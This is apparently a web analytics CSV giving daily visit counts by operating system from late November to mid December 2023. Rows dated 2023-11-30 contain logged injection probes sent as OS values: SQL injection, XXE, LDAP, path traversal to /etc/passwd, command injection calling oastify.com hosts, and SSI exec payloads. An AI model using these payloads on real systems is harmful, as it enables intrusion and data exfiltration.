date,os,visits
2023-12-12,iOS,17979134
2023-12-12,Windows,15139056
2023-12-12,Android,8617224
2023-12-12,Macintosh,4720681
2023-12-12,Chrome OS,1152181
2023-12-12,Linux,970343
2023-12-12,(not set),54143
2023-12-12,Tizen,940
2023-12-12,OS/2,603
2023-12-12,Fuchsia,547
2023-12-12,Firefox OS,421
2023-12-12,Playstation 4,302
2023-12-12,BlackBerry,105
2023-12-12,FreeBSD,66
2023-12-12,OpenBSD,43
2023-12-12,UNIX,39
2023-12-12,Samsung,35
2023-12-12,Xbox,35
2023-12-12,Windows Phone,26
2023-12-12,SymbianOS,20
2023-12-12,NetBSD,19
2023-12-12,SunOS,10
2023-12-12,Mac OS,8
2023-12-12,Sony,7
2023-12-12,Nokia,6
2023-12-12,Playstation Vita,4
2023-12-12,LG,3
2023-12-12,WebTV,3
2023-12-12,macOS X,3
2023-12-12,motorola/kiev_retail/kiev:11/RZK31.Q3-25-15/180c9:user/release-keys,3
2023-12-12,PalmOS,2
2023-12-12,BeOS,1
2023-12-12,IRIX,1
2023-12-12,Solaris,1
2023-12-12,TECNO/BF6-OP/TECNO-BF6:12/SP1A.210812.001/230408V493:user/release-keys,1
2023-12-12,iPhone,1
2023-12-12,realme/RMX2185/RMX2185:10/QP1A.190711.020/1655708528:user/release-keys,1
2023-12-11,iOS,19000515
2023-12-11,Windows,15421722
2023-12-11,Android,9175234
2023-12-11,Macintosh,4744340
2023-12-11,Chrome OS,1154442
2023-12-11,Linux,988263
2023-12-11,(not set),49841
2023-12-11,Tizen,921
2023-12-11,OS/2,630
2023-12-11,Fuchsia,536
2023-12-11,Firefox OS,417
2023-12-11,Playstation 4,320
2023-12-11,BlackBerry,117
2023-12-11,FreeBSD,70
2023-12-11,UNIX,54
2023-12-11,OpenBSD,38
2023-12-11,Samsung,35
2023-12-11,Xbox,34
2023-12-11,Windows Phone,31
2023-12-11,NetBSD,20
2023-12-11,SymbianOS,14
2023-12-11,Playstation Vita,6
2023-12-11,Sony,6
2023-12-11,Mac OS,4
2023-12-11,SunOS,4
2023-12-11,Nintendo Wii,3
2023-12-11,PalmOS,3
2023-12-11,TECNO/BF6-OP/TECNO-BF6:12/SP1A.210812.001/230408V493:user/release-keys,3
2023-12-11,LG,2
2023-12-11,Nokia,2
2023-12-11,Playstation 3,1
2023-12-11,Vodafone,1
2023-12-11,macOS X,1
2023-12-10,iOS,13070609
2023-12-10,Android,6766552
2023-12-10,Windows,5693904
2023-12-10,Macintosh,3028622
2023-12-10,Linux,794155
2023-12-10,Chrome OS,385113
2023-12-10,(not set),34525
2023-12-10,Tizen,937
2023-12-10,Fuchsia,600
2023-12-10,OS/2,587
2023-12-10,Firefox OS,434
2023-12-10,Playstation 4,388
2023-12-10,BlackBerry,114
2023-12-10,FreeBSD,64
2023-12-10,Xbox,34
2023-12-10,OpenBSD,33
2023-12-10,Windows Phone,30
2023-12-10,Samsung,27
2023-12-10,UNIX,21
2023-12-10,SymbianOS,16
2023-12-10,NetBSD,10
2023-12-10,SunOS,10
2023-12-10,Playstation Vita,6
2023-12-10,Sony,5
2023-12-10,Mac OS,3
2023-12-10,Nintendo Wii,3
2023-12-10,Nokia,3
2023-12-10,LG,2
2023-12-10,PalmOS,2
2023-12-10,macOS X,2
2023-12-10,Playstation 3,1
2023-12-10,Solaris,1
2023-12-10,T-Mobile/Newcastle/Newcastle:12/SP1A.210812.016/SW_S98117AA1_S_V023:user/release-keys,1
2023-12-10,TECNO/BF6-OP/TECNO-BF6:12/SP1A.210812.001/230408V493:user/release-keys,1
2023-12-10,WebTV,1
2023-12-10,samsung/b0quew/b0q:13/TP1A.220624.014/S908U1UEU2CWAI:user/release-keys,1
2023-12-09,iOS,15730805
2023-12-09,Android,7611695
2023-12-09,Windows,5373222
2023-12-09,Macintosh,2794971
2023-12-09,Linux,834340
2023-12-09,Chrome OS,310108
2023-12-09,(not set),37561
2023-12-09,Tizen,974
2023-12-09,OS/2,685
2023-12-09,Fuchsia,638
2023-12-09,Firefox OS,450
2023-12-09,Playstation 4,407
2023-12-09,BlackBerry,95
2023-12-09,FreeBSD,80
2023-12-09,UNIX,65
2023-12-09,OpenBSD,37
2023-12-09,Xbox,35
2023-12-09,Samsung,32
2023-12-09,SymbianOS,25
2023-12-09,Windows Phone,20
2023-12-09,NetBSD,15
2023-12-09,Mac OS,9
2023-12-09,Sony,9
2023-12-09,PalmOS,7
2023-12-09,SunOS,7
2023-12-09,Playstation Vita,6
2023-12-09,Nokia,5
2023-12-09,Solaris,3
2023-12-09,BeOS,1
2023-12-09,MOT,1
2023-12-09,NTT DoCoMo,1
2023-12-09,Playstation Portable,1
2023-12-09,Vodafone,1
2023-12-09,macOS X,1
2023-12-09,samsung/b0quew/b0q:13/TP1A.220624.014/S908U1UEU2CWAI:user/release-keys,1
2023-12-08,iOS,18141472
2023-12-08,Windows,12029833
2023-12-08,Android,8513504
2023-12-08,Macintosh,4013482
2023-12-08,Chrome OS,1023744
2023-12-08,Linux,1023146
2023-12-08,(not set),42952
2023-12-08,Tizen,913
2023-12-08,OS/2,647
2023-12-08,Fuchsia,548
2023-12-08,Firefox OS,448
2023-12-08,Playstation 4,389
2023-12-08,UNIX,145
2023-12-08,BlackBerry,102
2023-12-08,FreeBSD,76
2023-12-08,OpenBSD,39
2023-12-08,Xbox,36
2023-12-08,Samsung,31
2023-12-08,SymbianOS,30
2023-12-08,Windows Phone,26
2023-12-08,NetBSD,22
2023-12-08,Nokia,10
2023-12-08,Mac OS,6
2023-12-08,Sony,6
2023-12-08,BeOS,3
2023-12-08,Playstation Vita,3
2023-12-08,SunOS,3
2023-12-08,macOS X,3
2023-12-08,MOT,2
2023-12-08,PalmOS,2
2023-12-08,NTT DoCoMo,1
2023-12-08,motorola/kiev_retail/kiev:11/RZK31.Q3-25-15/180c9:user/release-keys,1
2023-12-08,samsung/b0quew/b0q:13/TP1A.220624.014/S908U1UEU2CWAI:user/release-keys,1
2023-12-07,iOS,19839824
2023-12-07,Windows,15065560
2023-12-07,Android,8984619
2023-12-07,Macintosh,4742842
2023-12-07,Chrome OS,1230112
2023-12-07,Linux,1138846
2023-12-07,(not set),40251
2023-12-07,Tizen,920
2023-12-07,OS/2,666
2023-12-07,Fuchsia,577
2023-12-07,Firefox OS,459
2023-12-07,Playstation 4,403
2023-12-07,BlackBerry,108
2023-12-07,FreeBSD,89
2023-12-07,Xbox,43
2023-12-07,OpenBSD,36
2023-12-07,Samsung,33
2023-12-07,UNIX,28
2023-12-07,SymbianOS,23
2023-12-07,Windows Phone,21
2023-12-07,NetBSD,14
2023-12-07,Mac OS,10
2023-12-07,SunOS,7
2023-12-07,Playstation Vita,6
2023-12-07,Sony,6
2023-12-07,PalmOS,5
2023-12-07,macOS X,3
2023-12-07,Nokia,2
2023-12-07,BeOS,1
2023-12-07,HPUX,1
2023-12-07,MOT,1
2023-12-07,Playstation 3,1
2023-12-07,Playstation Portable,1
2023-12-07,iPhone,1
2023-12-06,iOS,19312115
2023-12-06,Windows,16174418
2023-12-06,Android,8936159
2023-12-06,Macintosh,4831355
2023-12-06,Chrome OS,1219619
2023-12-06,Linux,1134953
2023-12-06,(not set),41177
2023-12-06,Tizen,981
2023-12-06,OS/2,562
2023-12-06,Fuchsia,507
2023-12-06,Firefox OS,441
2023-12-06,Playstation 4,370
2023-12-06,BlackBerry,101
2023-12-06,FreeBSD,82
2023-12-06,UNIX,71
2023-12-06,Windows Phone,39
2023-12-06,Xbox,36
2023-12-06,OpenBSD,31
2023-12-06,Samsung,31
2023-12-06,SymbianOS,23
2023-12-06,NetBSD,16
2023-12-06,Mac OS,8
2023-12-06,SunOS,8
2023-12-06,Nokia,4
2023-12-06,Playstation Vita,4
2023-12-06,Sony,4
2023-12-06,PalmOS,3
2023-12-06,macOS X,2
2023-12-06,IRIX,1
2023-12-06,Nintendo Wii,1
2023-12-06,Playstation 3,1
2023-12-06,Vodafone,1
2023-12-06,iPhone,1
2023-12-05,iOS,19363618
2023-12-05,Windows,15870248
2023-12-05,Android,9359706
2023-12-05,Macintosh,5010919
2023-12-05,Chrome OS,1267683
2023-12-05,Linux,1190116
2023-12-05,(not set),36460
2023-12-05,Tizen,982
2023-12-05,OS/2,594
2023-12-05,Fuchsia,566
2023-12-05,Firefox OS,483
2023-12-05,Playstation 4,354
2023-12-05,BlackBerry,99
2023-12-05,FreeBSD,78
2023-12-05,UNIX,51
2023-12-05,OpenBSD,40
2023-12-05,Xbox,33
2023-12-05,Samsung,26
2023-12-05,NetBSD,20
2023-12-05,Windows Phone,20
2023-12-05,SymbianOS,18
2023-12-05,Mac OS,9
2023-12-05,Playstation Vita,9
2023-12-05,Sony,9
2023-12-05,SunOS,6
2023-12-05,Nintendo Wii,4
2023-12-05,PalmOS,4
2023-12-05,macOS X,4
2023-12-05,Nokia,3
2023-12-05,BeOS,1
2023-12-05,IRIX,1
2023-12-05,NTT DoCoMo,1
2023-12-05,SoftBank,1
2023-12-05,T-Mobile/Newcastle/Newcastle:12/SP1A.210812.016/SW_S98117AA1_S_V023:user/release-keys,1
2023-12-05,Vodafone,1
2023-12-05,iPhone,1
2023-12-04,iOS,20046163
2023-12-04,Windows,16429056
2023-12-04,Android,9538506
2023-12-04,Macintosh,5304277
2023-12-04,Chrome OS,1227045
2023-12-04,Linux,1080348
2023-12-04,(not set),32946
2023-12-04,Tizen,1021
2023-12-04,OS/2,604
2023-12-04,Fuchsia,556
2023-12-04,Firefox OS,451
2023-12-04,Playstation 4,367
2023-12-04,BlackBerry,119
2023-12-04,FreeBSD,91
2023-12-04,UNIX,66
2023-12-04,Samsung,46
2023-12-04,Windows Phone,34
2023-12-04,OpenBSD,33
2023-12-04,Xbox,31
2023-12-04,NetBSD,18
2023-12-04,SymbianOS,17
2023-12-04,Mac OS,11
2023-12-04,Sony,6
2023-12-04,Nokia,4
2023-12-04,SunOS,4
2023-12-04,PalmOS,3
2023-12-04,macOS X,3
2023-12-04,MOT,2
2023-12-04,Playstation Vita,2
2023-12-04,SoftBank,2
2023-12-04,BeOS,1
2023-12-04,NTT DoCoMo,1
2023-12-04,OPPO/CPH2239/OP4F2F:11/RP1A.200720.011/1690886540868:user/release-keys,1
2023-12-04,OnePlus/OnePlus7Pro_EEA/OnePlus7Pro:12/SKQ1.211113.001/P.202301251815:user/release-keys,1
2023-12-04,Playstation 3,1
2023-12-04,Solaris,1
2023-12-03,iOS,13661379
2023-12-03,Android,6963910
2023-12-03,Windows,6073273
2023-12-03,Macintosh,3289828
2023-12-03,Linux,917120
2023-12-03,Chrome OS,401947
2023-12-03,(not set),21745
2023-12-03,Tizen,951
2023-12-03,OS/2,617
2023-12-03,Fuchsia,554
2023-12-03,Firefox OS,393
2023-12-03,Playstation 4,319
2023-12-03,BlackBerry,114
2023-12-03,FreeBSD,64
2023-12-03,Samsung,34
2023-12-03,UNIX,34
2023-12-03,OpenBSD,30
2023-12-03,Xbox,27
2023-12-03,SymbianOS,24
2023-12-03,NetBSD,22
2023-12-03,Windows Phone,22
2023-12-03,Playstation Vita,7
2023-12-03,Sony,7
2023-12-03,Mac OS,6
2023-12-03,PalmOS,4
2023-12-03,Nokia,2
2023-12-03,SunOS,2
2023-12-03,macOS X,2
2023-12-03,BeOS,1
2023-12-03,IRIX,1
2023-12-03,Nintendo Wii,1
2023-12-03,Vodafone,1
2023-12-02,iOS,16397242
2023-12-02,Android,8016086
2023-12-02,Windows,6069318
2023-12-02,Macintosh,3027077
2023-12-02,Linux,886619
2023-12-02,Chrome OS,346461
2023-12-02,(not set),23930
2023-12-02,Tizen,1038
2023-12-02,Fuchsia,608
2023-12-02,OS/2,599
2023-12-02,Firefox OS,410
2023-12-02,Playstation 4,357
2023-12-02,BlackBerry,95
2023-12-02,FreeBSD,88
2023-12-02,OpenBSD,49
2023-12-02,UNIX,46
2023-12-02,Samsung,40
2023-12-02,NetBSD,30
2023-12-02,Xbox,25
2023-12-02,Windows Phone,18
2023-12-02,SymbianOS,13
2023-12-02,Mac OS,11
2023-12-02,Sony,7
2023-12-02,SunOS,7
2023-12-02,Nokia,4
2023-12-02,Playstation Vita,3
2023-12-02,MOT,2
2023-12-02,PalmOS,2
2023-12-02,WebTV,1
2023-12-02,macOS X,1
2023-12-02,samsung/a53xnsxx/a53x:13/TP1A.220624.014/A536EXXU7CWGJ:user/release-keys,1
2023-12-02,samsung/t2qzhx/t2q:13/TP1A.220624.014/G9960ZHU5EWH6:user/release-keys,1
2023-12-01,iOS,19113402
2023-12-01,Windows,13664534
2023-12-01,Android,8866282
2023-12-01,Macintosh,4523400
2023-12-01,Chrome OS,1143538
2023-12-01,Linux,986266
2023-12-01,(not set),28428
2023-12-01,Tizen,1227
2023-12-01,OS/2,689
2023-12-01,Fuchsia,515
2023-12-01,Firefox OS,512
2023-12-01,Playstation 4,335
2023-12-01,FreeBSD,90
2023-12-01,BlackBerry,78
2023-12-01,Samsung,36
2023-12-01,Xbox,33
2023-12-01,OpenBSD,27
2023-12-01,UNIX,22
2023-12-01,NetBSD,21
2023-12-01,Windows Phone,20
2023-12-01,SymbianOS,19
2023-12-01,Mac OS,13
2023-12-01,Sony,9
2023-12-01,Playstation Vita,7
2023-12-01,SunOS,7
2023-12-01,Nokia,6
2023-12-01,PalmOS,6
2023-12-01,Playstation Portable,2
2023-12-01,macOS X,2
2023-12-01,BeOS,1
2023-12-01,NTT DoCoMo,1
2023-12-01,OPPO/CPH2239/OP4F2F:11/RP1A.200720.011/1690886540868:user/release-keys,1
2023-11-30,iOS,18809314
2023-11-30,Windows,16309153
2023-11-30,Android,9210307
2023-11-30,Macintosh,4924649
2023-11-30,Chrome OS,1298595
2023-11-30,Linux,1062833
2023-11-30,(not set),36494
2023-11-30,Tizen,1330
2023-11-30,OS/2,698
2023-11-30,Fuchsia,558
2023-11-30,Firefox OS,500
2023-11-30,Playstation 4,361
2023-11-30,BlackBerry,119
2023-11-30,FreeBSD,77
2023-11-30,OpenBSD,48
2023-11-30,UNIX,40
2023-11-30,Samsung,35
2023-11-30,Windows Phone,34
2023-11-30,SymbianOS,23
2023-11-30,NetBSD,21
2023-11-30,Xbox,16
2023-11-30,Playstation Vita,15
2023-11-30,Mac OS,13
2023-11-30,Sony,6
2023-11-30,Nokia,5
2023-11-30,PalmOS,4
2023-11-30,SunOS,3
2023-11-30,MOT,2
2023-11-30,Nintendo Wii,2
2023-11-30,"(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % graxq SYSTEM ""http://woo7ur2i2kf80r9v5bzoe0ssajgc42s5gw31rq.oasti'||'fy.com/"">%graxq;]>'),'/l') from dual)",1
2023-11-30,(select load_file('\\\\fo7qua2123fr0a9e5uz7ejsba2gv4lscu0lnqbf.oastify.com\\eqb')),1
2023-11-30,*)(!(objectClass=*),1
2023-11-30,*)(objectClass=*,1
2023-11-30,-->'-->`--><!--#set var=vgy value=ufx5lptgti--><!--#set var=xi0 value=whz7nrvivk--><!--#echo var=vgy--><!--#echo var=xi0--><!--#exec cmd=nslookup -q=cname h2ks8cg3g5ttecngjwd9sl6do4uxin6f43vq0ep.oastify.com -->,1
2023-11-30,.../Linux,1
2023-11-30,../../../../../../../../../../../../../../../../etc/passwd,1
2023-11-30,../../../../../../../../../../../../../../../../etc/passwd%00Linux,1
2023-11-30,..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini,1
2023-11-30,..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini%00Linux,1
2023-11-30,/etc/passwd,1
2023-11-30,4uivbesp1i)(!(objectClass=*),1
2023-11-30,"<ckj xmlns=""http://a.b/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://a.b/ http://il7trdz4z6cuxd6h2xwabmpe75dy1opodf0ko9.oastify.com/ckj.xsd"">ckj</ckj>",1
2023-11-30,"<ydl xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""http://vsr6yq6h6jj74qdu9a3nizwreikb81w2kt7yvn.oastify.com/foo""/></ydl>",1
2023-11-30,BeOS,1
2023-11-30,LG,1
2023-11-30,"Linux
BCC:go8rub2224fs0b9f5vz8eksca3gw4msel2cphd6@oastify.com
vte: d",1
2023-11-30,"Linux""",1
2023-11-30,"Linux""|echo d47iksvf5m ctdmejl6bp ||",1
2023-11-30,"Linux""|ping -n 21 127.0.0.1 ||",1
2023-11-30,"Linux%}lvxrn'/""<pnroj",1
2023-11-30,Linux&echo 4r76ggl8d8 freo5ed8r5&,1
2023-11-30,"Linux&nslookup -q=cname 6krhq1ysyubiw1551lvyaao26tcm0co7cyz3ns.oastify.com.&'\""`0&nslookup -q=cname 6krhq1ysyubiw1551lvyaao26tcm0co7cyz3ns.oastify.com.&`'",1
2023-11-30,Linux&ping -n 21 127.0.0.1&,1
2023-11-30,Linux',1
2023-11-30,Linux' and '3424'='3424,1
2023-11-30,Linux' and '4452'='4460,1
2023-11-30,Linux' and (select*from(select(sleep(20)))a)-- ,1
2023-11-30,Linux' and 2206=2208-- ,1
2023-11-30,Linux' and 4141=4141-- ,1
2023-11-30,Linux' waitfor delay'0:0:20'--,1
2023-11-30,"Linux'""`0&nslookup -q=cname 5hngn0vrvt8ht024yksx79l13s9lxbl89zw4kt.oastify.com.&`'",1
2023-11-30,Linux'(select*from(select(sleep(20)))a)',1
2023-11-30,Linux');declare @q varchar(99);set @q='\\255dbxjojqwehxq1mhguv69yrpxil89z2ntayyn.oasti'+'fy.com\hrs'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,Linux')waitfor delay'0:0:20'--,1
2023-11-30,"Linux'+(function(){if(typeof zxmyz===""undefined""){var a=new Date();do{var b=new Date();}while(b-a<20000);zxmyz=1;}}())+'",1
2023-11-30,Linux'+(select load_file('\\\\mqgxwh484ahy2hbl711egquic9i26sujx7outii.oastify.com\\cvk'))+',1
2023-11-30,Linux'+(select*from(select(sleep(20)))a)+',1
2023-11-30,"Linux'+eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))+'",1
2023-11-30,Linux'+sleep(20.to_i)+',1
2023-11-30,"Linux',0)waitfor delay'0:0:20'--",1
2023-11-30,Linux'.sleep(20).',1
2023-11-30,Linux';declare @q varchar(99);set @q='\\sie3onwewg94un3rz7tk8wmo4fa8yympdd409oy.oasti'+'fy.com\gts'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,"Linux'|echo 3o866q8h9s cd9w4term0 #xzwx",1
2023-11-30,"Linux'|ping -c 21 127.0.0.1 #",1
2023-11-30,"Linux'||(select extractvalue(xmltype('<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE root [ <!ENTITY % graxq SYSTEM ""http://jylu4ec5c7pvaejify9bon2fk6qzep2tqkdp1e.oasti'||'fy.com/"">%graxq;]>'),'/l') from dual)||'",1
2023-11-30,Linux);declare @q varchar(99);set @q='\\grbrxb5254is3bcf8v28hkvcd3jw7mvdn1eojc8.oasti'+'fy.com\dwu'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,"Linux,(select*from(select(sleep(20)))a)",1
2023-11-30,Linux../../../../../../../../../../../../../../../../etc/passwd,1
2023-11-30,Linux..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini,1
2023-11-30,Linux42267017' or '7302'='7303,1
2023-11-30,Linux43845002' or 7978=7978-- ,1
2023-11-30,Linux65212037' or 2382=2388-- ,1
2023-11-30,Linux74903521' or '9415'='9415,1
2023-11-30,Linux;declare @q varchar(99);set @q='\\b3fm96hxhzunf6oakqe3tf77pyvrjh78xwojt7i.oasti'+'fy.com\yay'; exec master.dbo.xp_dirtree @q;-- ,1
2023-11-30,"Linux>
BCC:nb2yhip9pb2zniwms2mf1rfjxa33rtfl990w5ku@oastify.com
hto: e",1
2023-11-30,Linux]]>><,1
2023-11-30,"Linuxsll52%>xo4ck'/""<zg08j",1
2023-11-30,Linuxwg2r40hwrc,1
2023-11-30,Linux{${sleep(20)}},1
2023-11-30,"Linux|echo 8dlxnd1jx8 571y402hz1||a #' |echo 8dlxnd1jx8 571y402hz1||a #|"" |echo 8dlxnd1jx8 571y402hz1||a #",1
2023-11-30,"Linux|nslookup -q=cname zloaruzlzncbxu6y2ewrb3pv7mdf15p1ds0xom.oastify.com.&",1
2023-11-30,"Linux|ping -c 21 127.0.0.1||x",1
2023-11-30,"Linux|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\"" |ping -n 21 127.0.0.1",1
2023-11-30,"Linux}}g3za3'/""<vb6sf",1
2023-11-30,OPPO/CPH2239/OP4F2F:11/RP1A.200720.011/1690886540868:user/release-keys,1
2023-11-30,be51smiq09,1
2023-11-30,c:\windows\win.ini,1
2023-11-30,"eval(compile('for x in range(1):\n import time\n time.sleep(20)','a','single'))",1
2023-11-30,http://ei0po9w0w29qu93dztt68ima41auykmaa1x6lv.oastify.com/?Linux,1
2023-11-30,n1py7if9fbszdimmi2cfrr5jnat3ht5ltcgh46.oastify.com,1
2023-11-30,n4p4ifaq49)(objectClass=*,1
2023-11-30,nslookup -q=cname 94bka4ivixvlg4p8lof1ud85qwwpkf88bw2j77w.oastify.com.&,1
2023-11-30,rr8iw0o5dt,1
2023-11-29,iOS,18920876
2023-11-29,Windows,15747501
2023-11-29,Android,8914422
2023-11-29,Macintosh,4961379
2023-11-29,Chrome OS,1240160
2023-11-29,Linux,1038084
2023-11-29,(not set),33160
2023-11-29,Tizen,899
2023-11-29,OS/2,593
2023-11-29,Fuchsia,580
2023-11-29,Firefox OS,466
2023-11-29,Playstation 4,335
2023-11-29,BlackBerry,109
2023-11-29,FreeBSD,91
2023-11-29,UNIX,72
2023-11-29,Samsung,41
2023-11-29,OpenBSD,40
2023-11-29,Windows Phone,40
2023-11-29,SymbianOS,31
2023-11-29,Xbox,19
2023-11-29,NetBSD,18
2023-11-29,Sony,16
2023-11-29,Mac OS,15
2023-11-29,SunOS,14
2023-11-29,Nokia,6
2023-11-29,MOT,2
2023-11-29,NTT DoCoMo,2
2023-11-29,PalmOS,2
2023-11-29,Playstation 3,2
2023-11-29,Playstation Vita,2
2023-11-29,Solaris,2
2023-11-29,BeOS,1
2023-11-29,IRIX,1
2023-11-29,LG,1
2023-11-28,iOS,17826241
2023-11-28,Windows,15522539
2023-11-28,Android,8512451
2023-11-28,Macintosh,5134088
2023-11-28,Chrome OS,1243361
2023-11-28,Linux,1083147
2023-11-28,(not set),40256
2023-11-28,Tizen,892
2023-11-28,OS/2,633
2023-11-28,Fuchsia,601
2023-11-28,Firefox OS,440
2023-11-28,Playstation 4,333
2023-11-28,BlackBerry,128
2023-11-28,FreeBSD,95
2023-11-28,Samsung,39
2023-11-28,UNIX,36
2023-11-28,OpenBSD,30
2023-11-28,SymbianOS,29
2023-11-28,Xbox,27
2023-11-28,Windows Phone,22
2023-11-28,NetBSD,18
2023-11-28,SunOS,11
2023-11-28,Playstation Vita,9
2023-11-28,Nokia,5
2023-11-28,Sony,4
2023-11-28,Mac OS,3
2023-11-28,NTT DoCoMo,2
2023-11-28,PalmOS,2
2023-11-28,BeOS,1
2023-11-28,MOT,1
2023-11-28,Playstation Portable,1
2023-11-28,WebTV,1
2023-11-28,macOS X,1
2023-11-27,iOS,17441512
2023-11-27,Windows,16375703
2023-11-27,Android,8519500
2023-11-27,Macintosh,5019810
2023-11-27,Chrome OS,1119338
2023-11-27,Linux,1015509
2023-11-27,(not set),34099
2023-11-27,Tizen,910
2023-11-27,OS/2,609
2023-11-27,Fuchsia,566
2023-11-27,Firefox OS,462
2023-11-27,Playstation 4,304
2023-11-27,BlackBerry,114
2023-11-27,FreeBSD,106
2023-11-27,OpenBSD,53
2023-11-27,UNIX,50
2023-11-27,Samsung,41
2023-11-27,SymbianOS,30
2023-11-27,Xbox,28
2023-11-27,NetBSD,24
2023-11-27,Windows Phone,23
2023-11-27,SunOS,12
2023-11-27,Playstation Vita,8
2023-11-27,Sony,7
2023-11-27,Nintendo Wii,5
2023-11-27,Nokia,5
2023-11-27,PalmOS,2
2023-11-27,LG,1
2023-11-27,MOT,1
2023-11-27,Mac OS,1
2023-11-27,NTT DoCoMo,1
2023-11-27,WebTV,1
2023-11-27,iPhone,1
2023-11-27,samsung/a14xub/a14x:13/TP1A.220624.014/A146MUBU2AWF4:user/release-keys,1
2023-11-26,iOS,11883302
2023-11-26,Android,6341407
2023-11-26,Windows,5719497
2023-11-26,Macintosh,2980726
2023-11-26,Linux,818510
2023-11-26,Chrome OS,347851
2023-11-26,(not set),25857
2023-11-26,Tizen,955
2023-11-26,Fuchsia,656
2023-11-26,OS/2,643
2023-11-26,Firefox OS,472
2023-11-26,Playstation 4,296
2023-11-26,BlackBerry,85
2023-11-26,FreeBSD,68
2023-11-26,Samsung,47
2023-11-26,UNIX,47
2023-11-26,OpenBSD,44
2023-11-26,SymbianOS,26
2023-11-26,Windows Phone,22
2023-11-26,Xbox,21
2023-11-26,NetBSD,20
2023-11-26,Playstation Vita,9
2023-11-26,Unknown,9
2023-11-26,Sony,7
2023-11-26,Mac OS,6
2023-11-26,Nokia,5
2023-11-26,SunOS,5
2023-11-26,iPhone,5
2023-11-26,Bada,4
2023-11-26,PalmOS,3
2023-11-26,Nintendo Wii,2
2023-11-26,BeOS,1
2023-11-25,iOS,13040965
2023-11-25,Android,6816631
2023-11-25,Windows,4967675
2023-11-25,Macintosh,2539208
2023-11-25,Linux,852744
2023-11-25,Chrome OS,271050
2023-11-25,(not set),22654
2023-11-25,Tizen,823
2023-11-25,OS/2,587
2023-11-25,Fuchsia,505
2023-11-25,Firefox OS,414
2023-11-25,Playstation 4,332
2023-11-25,BlackBerry,121
2023-11-25,FreeBSD,62
2023-11-25,UNIX,48
2023-11-25,Samsung,46
2023-11-25,Windows Phone,31
2023-11-25,OpenBSD,27
2023-11-25,SymbianOS,23
2023-11-25,NetBSD,22
2023-11-25,Xbox,16
2023-11-25,Sony,11
2023-11-25,PalmOS,6
2023-11-25,SunOS,6
2023-11-25,Mac OS,5
2023-11-25,Playstation Vita,5
2023-11-25,iPhone,5
2023-11-25,Nintendo Wii,4
2023-11-25,IRIX,3
2023-11-25,Nokia,3
2023-11-25,LG,2
2023-11-25,BeOS,1
2023-11-25,Playstation Portable,1
2023-11-25,Solaris,1
2023-11-24,iOS,13953271
2023-11-24,Android,7273453
2023-11-24,Windows,6862704
2023-11-24,Macintosh,2724185
2023-11-24,Linux,892154
2023-11-24,Chrome OS,298538
2023-11-24,(not set),28173
2023-11-24,Tizen,924
2023-11-24,OS/2,590
2023-11-24,Fuchsia,497
2023-11-24,Firefox OS,448
2023-11-24,Playstation 4,369
2023-11-24,BlackBerry,111
2023-11-24,FreeBSD,83
2023-11-24,Samsung,47
2023-11-24,OpenBSD,36
2023-11-24,UNIX,26
2023-11-24,Windows Phone,26
2023-11-24,SymbianOS,20
2023-11-24,Xbox,19
2023-11-24,NetBSD,17
2023-11-24,Mac OS,10
2023-11-24,Playstation Vita,6
2023-11-24,SunOS,5
2023-11-24,Nokia,4
2023-11-24,PalmOS,4
2023-11-24,WebTV,4
2023-11-24,Sony,2
2023-11-24,macOS X,2
2023-11-24,Nokia/Monster_00WW/MNR:11/RP1A.201005.001/00WW_1_910:user/release-keys,1
2023-11-24,Playstation 3,1
2023-11-24,Unknown,1
2023-11-24,iPhone,1
2023-11-24,samsung/dm1qsqw/dm1q:13/TP1A.220624.014/S911USQU1AWGH:user/release-keys,1
2023-11-23,iOS,10261966
2023-11-23,Android,5904223
2023-11-23,Windows,4979504
2023-11-23,Macintosh,2073245
2023-11-23,Linux,958396
2023-11-23,Chrome OS,260846
2023-11-23,(not set),31144
2023-11-23,Tizen,858
2023-11-23,OS/2,492
2023-11-23,Fuchsia,454
2023-11-23,Firefox OS,361
2023-11-23,Playstation 4,354
2023-11-23,BlackBerry,106
2023-11-23,FreeBSD,97
2023-11-23,Samsung,43
2023-11-23,UNIX,37
2023-11-23,OpenBSD,27
2023-11-23,Windows Phone,24
2023-11-23,SymbianOS,19
2023-11-23,Xbox,18
2023-11-23,NetBSD,13
2023-11-23,Playstation Vita,9
2023-11-23,Sony,8
2023-11-23,Mac OS,4
2023-11-23,SunOS,4
2023-11-23,iPhone,4
2023-11-23,Nintendo Wii,3
2023-11-23,Nokia,2
2023-11-23,Unknown,2
2023-11-23,Fedora,1
2023-11-23,IRIX,1
2023-11-23,LG,1
2023-11-23,PalmOS,1
2023-11-23,Solaris,1
2023-11-22,iOS,14779729
2023-11-22,Windows,11001452
2023-11-22,Android,7966179
2023-11-22,Macintosh,3415038
2023-11-22,Linux,1066058
2023-11-22,Chrome OS,398670
2023-11-22,(not set),26754
2023-11-22,Tizen,962
2023-11-22,OS/2,566
2023-11-22,Fuchsia,538
2023-11-22,Firefox OS,377
2023-11-22,Playstation 4,352
2023-11-22,FreeBSD,112
2023-11-22,BlackBerry,110
2023-11-22,UNIX,59
2023-11-22,Samsung,55
2023-11-22,Xbox,40
2023-11-22,Windows Phone,32
2023-11-22,SymbianOS,25
2023-11-22,OpenBSD,22
2023-11-22,NetBSD,14
2023-11-22,Mac OS,11
2023-11-22,Playstation Vita,6
2023-11-22,Sony,6
2023-11-22,Nintendo Wii,5
2023-11-22,Nokia,5
2023-11-22,SunOS,4
2023-11-22,iPhone,3
2023-11-22,PalmOS,2
2023-11-22,Unknown,2
2023-11-22,BeOS,1
2023-11-22,Fedora,1
2023-11-22,MOT,1
2023-11-22,NTT DoCoMo,1
2023-11-22,lge/cv7as/cv7as:10/QKQ1.200308.002/202391619c522:user/release-keys,1
2023-11-21,iOS,16048362
2023-11-21,Windows,14169231
